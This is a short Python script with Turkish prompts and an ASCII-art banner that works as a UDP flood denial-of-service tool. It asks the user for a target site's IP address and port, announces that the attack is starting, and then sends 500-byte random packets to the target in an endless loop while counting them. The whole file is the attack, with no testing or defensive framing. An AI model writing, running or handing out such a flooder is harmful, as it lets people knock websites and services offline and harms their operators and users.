import os
import socket
import time
import random


os.system("cls")

print("""

_______               __     __                   _______ __   __               __               
|    |  |.--.--.-----.|  |--.|__|.-----.-----.    |   _   |  |_|  |_.---.-.----.|  |--.-----.----.
|       ||  |  |  _  ||    < |  ||     |  _  |    |       |   _|   _|  _  |  __||    <|  -__|   _|
|__|____||_____|__   ||__|__||__||__|__|___  |    |___|___|____|____|___._|____||__|__|_____|__|  
                  |__|                 |_____|                                                


""")

ip = input("Hedef Site Ip si:")
port = int(input("Hedef Port(80):"))
print("Saldırı Başlatılıyor...")
time.sleep(4)
sayac = 0
bytes = random._urandom(500)

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(bytes,(ip,port))
    sayac = sayac + 1
    print("Saldırı Başlatıldı!Gönderilen Paket:%s"%(sayac))
    s.close()